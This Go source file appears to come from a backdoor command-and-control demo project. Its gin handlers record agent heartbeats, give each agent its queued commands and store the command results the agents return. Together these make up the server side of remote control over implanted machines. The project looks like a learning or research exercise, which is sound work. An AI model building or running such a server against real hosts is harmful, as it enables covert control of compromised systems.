package routers

import (
	"encoding/json"
	"fmt"
	"net/http"
	"strconv"
	"SafeDp/backdoor/command-control-demo/server/models"
	"github.com/gin-gonic/gin"
)

// Ping 接收客户端的心跳包
func Ping(c *gin.Context) {
	var agent models.Agent
	err := c.BindJSON(&agent)
	fmt.Println(agent, err)
	agentId := agent.AgentId
	has, err := models.ExistAgentId(agentId)
	if err == nil && has {
		_ = models.UpdateAgent(agent)
	} else {
		err = agent.Insert()
		fmt.Println(err)
	}
}

// 服务端下发命令给客户端
func GetCommand(c *gin.Context) { 
	agentId := c.Param("uuid")
	cmds,_ := models.GetCommandByAgentId(agentId)
	cmdJson, _ := json.Marshal(cmds)
	fmt.Println(agentId, string(cmdJson))
	c.JSON(http.StatusOK, cmds)
}

//
func SendResult(c *gin.Context) {
	cmdId := c.Param("id")
	result := c.PostForm("result")
	id,_ := strconv.Atoi(cmdId)
	err := models.UpdateCommandResult(int64(id), result)
	fmt.Println(cmdId, result, err, c.Request.PostForm)
	if err == nil {
		err = models.SetCmdStatusToFinished(int64(id))
	}
}